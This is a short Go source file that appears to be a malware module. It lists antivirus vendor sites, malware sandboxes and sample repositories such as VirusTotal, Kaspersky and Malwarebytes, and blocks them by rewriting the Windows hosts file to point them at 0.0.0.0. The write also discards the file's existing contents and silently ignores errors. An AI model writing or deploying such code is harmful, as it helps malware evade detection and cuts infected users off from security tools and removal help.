package main

import (
	"os"
	"strings"
)

// List of sandbox, analysis, and antivirus websites to block
var blockedSites = []string{
	"virustotal.com",
	"hybrid-analysis.com",
	"any.run",
	"app.any.run",
	"joesandbox.com",
	"analyze.intezer.com",
	"cuckoosandbox.org",
	"tria.ge",
	"malwarebazaar.abuse.ch",
	"bazaar.abuse.ch",
	"malshare.com",
	"vx-underground.org",

	"kaspersky.com",
	"kaspersky.fr",
	"my.kaspersky.com",
	"symantec.com",
	"norton.com",
	"mcafee.com",
	"trendmicro.com",
	"bitdefender.com",
	"avast.com",
	"avg.com",
	"f-secure.com",
	"malwarebytes.com",
}

const hostsFilePath = `C:\Windows\System32\drivers\etc\hosts`

func blockSites() {
	f, err := os.ReadFile(hostsFilePath)
	if err != nil {
		return
	}

	var b []byte
	for _, site := range blockedSites {
		if strings.Contains(string(f), site) {
			continue
		}
		// Append entries to block the site by redirecting to loopback address
		b = append(b, []byte("0.0.0.0 "+site+"\n")...)
		b = append(b, []byte("0.0.0.0 www."+site+"\n")...)
	}
	if err := os.WriteFile(hostsFilePath, b, 0644); err != nil {
		return
	}
}
